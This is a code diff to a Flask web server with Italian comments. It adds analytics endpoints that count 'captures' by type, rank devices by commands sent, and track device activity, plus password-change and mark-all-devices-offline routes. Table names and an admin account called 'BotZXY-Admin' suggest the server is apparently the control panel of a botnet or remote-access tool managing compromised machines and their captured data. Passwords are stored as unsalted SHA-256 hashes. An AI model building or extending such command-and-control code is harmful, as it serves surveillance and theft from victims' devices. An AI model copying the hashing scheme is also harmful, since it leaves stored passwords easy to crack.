@@ -673,6 +673,96 @@ def get_device_stats():
         'activity_7d': [dict(a) for a in activity]
     })
 
+# ============ API ANALYTICS ============
+@app.route('/api/analytics/captures_by_type', methods=['GET'])
+@login_required
+def get_captures_by_type():
+    """Statistiche catture per tipo"""
+    conn = get_db()
+    data = conn.execute('''
+        SELECT type, COUNT(*) as count 
+        FROM captures 
+        GROUP BY type 
+        ORDER BY count DESC
+    ''').fetchall()
+    conn.close()
+    return jsonify([dict(d) for d in data])
+
+@app.route('/api/analytics/activity_7d', methods=['GET'])
+@login_required
+def get_activity_7d():
+    """Attività ultimi 7 giorni"""
+    conn = get_db()
+    data = conn.execute('''
+        SELECT date(last_seen) as day, COUNT(*) as count
+        FROM devices 
+        WHERE last_seen >= datetime('now', '-7 days')
+        GROUP BY date(last_seen)
+        ORDER BY day
+    ''').fetchall()
+    conn.close()
+    return jsonify([dict(d) for d in data])
+
+@app.route('/api/analytics/top_devices', methods=['GET'])
+@login_required
+def get_top_devices():
+    """Dispositivi più attivi"""
+    conn = get_db()
+    data = conn.execute('''
+        SELECT device_id, hostname, platform, 
+               COUNT(*) as commands_count,
+               (SELECT COUNT(*) FROM captures WHERE captures.device_id = devices.device_id) as captures_count
+        FROM devices
+        LEFT JOIN commands ON commands.device_id = devices.device_id
+        GROUP BY devices.device_id
+        ORDER BY commands_count DESC
+        LIMIT 10
+    ''').fetchall()
+    conn.close()
+    return jsonify([dict(d) for d in data])
+
+# ============ SICUREZZA ============
+@app.route('/api/change_password', methods=['POST'])
+@login_required
+def change_password():
+    data = request.json
+    old_password = data.get('old_password')
+    new_password = data.get('new_password')
+    
+    if not old_password or not new_password:
+        return jsonify({'error': 'Vecchia e nuova password richieste'}), 400
+    
+    conn = get_db()
+    user = conn.execute('SELECT * FROM users WHERE id = ?', (current_user.id,)).fetchone()
+    
+    if not user or hashlib.sha256(old_password.encode()).hexdigest() != user['password_hash']:
+        conn.close()
+        return jsonify({'error': 'Password attuale errata'}), 401
+    
+    conn.execute('UPDATE users SET password_hash = ? WHERE id = ?', 
+                (hashlib.sha256(new_password.encode()).hexdigest(), current_user.id))
+    conn.commit()
+    conn.close()
+    log_action('system', 'password_changed', f'Password cambiata da {current_user.username}')
+    return jsonify({'status': 'password_updated'})
+
+@app.route('/api/logout_all', methods=['POST'])
+@login_required
+def logout_all():
+    """Disconnette tutti i dispositivi (solo admin)"""
+    conn = get_db()
+    current_user_data = conn.execute('SELECT * FROM users WHERE id = ?', (current_user.id,)).fetchone()
+    if current_user_data['username'] != 'admin' and current_user_data['username'] != 'BotZXY-Admin':
+        conn.close()
+        return jsonify({'error': 'Accesso negato'}), 403
+    
+    # Imposta tutti i dispositivi come offline
+    conn.execute('UPDATE devices SET is_online = 0')
+    conn.commit()
+    conn.close()
+    log_action('system', 'logout_all', 'Tutti i dispositivi disconnessi')
+    return jsonify({'status': 'logged_out'})
+
 # ============ ADMIN SETUP ============
 def setup_admin_user():
     try:
